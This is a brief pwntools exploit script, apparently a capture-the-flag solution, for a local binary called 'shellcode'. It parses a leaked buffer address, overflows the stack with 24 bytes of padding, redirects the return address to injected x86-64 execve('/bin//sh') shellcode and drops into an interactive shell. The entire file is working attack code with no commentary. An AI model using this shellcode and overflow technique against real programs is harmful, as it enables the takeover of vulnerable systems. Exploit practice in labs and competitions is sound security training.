#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
import sys

pwd = sys.path[0]
context.log_level = 'debug'
p = process(pwd + '/shellcode')

p.recvuntil(b'[')
buf_addr_str = p.recvuntil(b']', drop=True)
buf_addr = int(buf_addr_str, 16)
print(hex(buf_addr))

shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'

payload = b'A' * 24  
payload += p64(buf_addr + 24 + 8) 
payload += shellcode  

p.sendlineafter(b'Now give me your answer : \n', payload)
p.interactive()